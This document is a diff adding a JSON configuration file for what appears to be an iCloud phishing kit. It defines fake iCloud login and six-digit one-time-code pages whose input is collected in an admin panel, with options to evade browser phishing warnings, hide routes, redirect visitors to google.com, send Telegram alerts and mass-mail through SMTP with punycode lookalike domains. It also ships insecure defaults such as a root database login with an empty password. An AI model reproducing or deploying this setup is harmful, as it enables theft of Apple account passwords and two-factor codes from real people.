@@ -1,0 +1,136 @@
+{
+  "service": "iCloud",
+  "flask": {
+    "host": "0.0.0.0",
+    "port": 3000,
+    "debug": true
+  },
+  "mysql": {
+    "host": "localhost",
+    "user": "root",
+    "password": "",
+    "database": "panel",
+    "port": 3306
+  },
+  "admin": {
+    "login_route": "/adminlogin",
+    "dashboard_route": "/admin",
+    "password": "admin_pass"
+  },
+  "redirect": "google.com",
+  "waiting": "/waiting",
+  "background_color": "#0a0b0d",
+  "no_route": true,
+  "param_conf": {},
+  "options": {
+    "panel_status": true,
+    "anti_redpage": true,
+    "block_proxy": false,
+    "mobile_only": false,
+    "hide_route": true,
+    "showNotifications": true,
+    "deleteInactiveSessions": "true",
+    "redirectURL": "google.com",
+    "workflow_mode": false,
+    "workflow_pages": [],
+    "telegram": {
+      "telegram_notification": false,
+      "telegram_chat_id": "CHAT ID HERE",
+      "telegram_bot_token": "BOT TOKEN HERE"
+    },
+    "soundEffects": true,
+    "admin_whitelist": [
+      "127.0.0.1"
+    ]
+  },
+  "email": {
+    "smtp_servers": [],
+    "email_details": {
+      "batch_size": 20,
+      "punycode": true
+    }
+  },
+  "data_links": [],
+  "pages": {
+    "icloud_login": {
+      "template": "/icloud/login.html",
+      "route": "/icloud_login",
+      "panel": {
+          "input": {
+              "name": "iCloud Login",
+              "values": [
+                  {
+                      "value": "icloud_password",
+                      "placeholder": "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022",
+                      "type": "text"
+                  }
+              ],
+              "required_data": [
+                  {
+                      "value": "email",
+                      "placeholder": "example@icloud.com",
+                      "type": "text"
+                  }
+              ]
+          }
+      },
+      "form": {
+          "icloud_password": "icloud_password"
+      },
+      "preview_image": "previews/icloud/login.png"
+  },
+  "icloud_otp": {
+      "template": "/icloud/otp.html",
+      "route": "/icloud_otp",
+      "type": "otp",
+      "panel": {
+          "input": {
+              "name": "iCloud OTP",
+              "values": [
+                  {
+                      "value": "code1",
+                      "placeholder": "1",
+                      "type": "text"
+                  },
+                  {
+                      "value": "code2",
+                      "placeholder": "2",
+                      "type": "text"
+                  },
+                  {
+                      "value": "code3",
+                      "placeholder": "3",
+                      "type": "text"
+                  },
+                  {
+                      "value": "code4",
+                      "placeholder": "4",
+                      "type": "text"
+                  },
+                  {
+                      "value": "code5",
+                      "placeholder": "5",
+                      "type": "text"
+                  },
+                  {
+                      "value": "code6",
+                      "placeholder": "6",
+                      "type": "text"
+                  }
+              ],
+              "required_data": []
+          }
+      },
+      "form": {
+          "code1": "code1",
+          "code2": "code2",
+          "code3": "code3",
+          "code4": "code4",
+          "code5": "code5",
+          "code6": "code6"
+      },
+      "preview_image": "previews/icloud/otp.png"
+  }
+  },
+  "version": "0.0"
+}
